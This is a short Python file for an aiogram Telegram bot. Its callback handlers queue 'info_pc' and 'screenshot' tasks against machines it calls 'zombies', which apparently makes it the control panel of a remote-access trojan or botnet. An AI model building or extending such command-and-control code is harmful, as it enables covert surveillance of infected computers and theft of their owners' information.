from core.loader import dp, tasks
from utils.get_info import check_on
from bot.keyb import control
from type import TypeTasks

from aiogram import types, F
import asyncio

@dp.callback_query(F.data[:18]=='main_control_main_')
async def main_control_main(call: types.CallbackQuery):
    await tasks.add_task(type_task=TypeTasks.info_pc, zombie=call.data[18:])

@dp.callback_query(F.data[:19]=='control_screenshot_')
async def control_screenshot(call: types.CallbackQuery):
    await tasks.add_task(type_task=TypeTasks.screenshot, zombie=call.data[19:])
    await call.message.delete()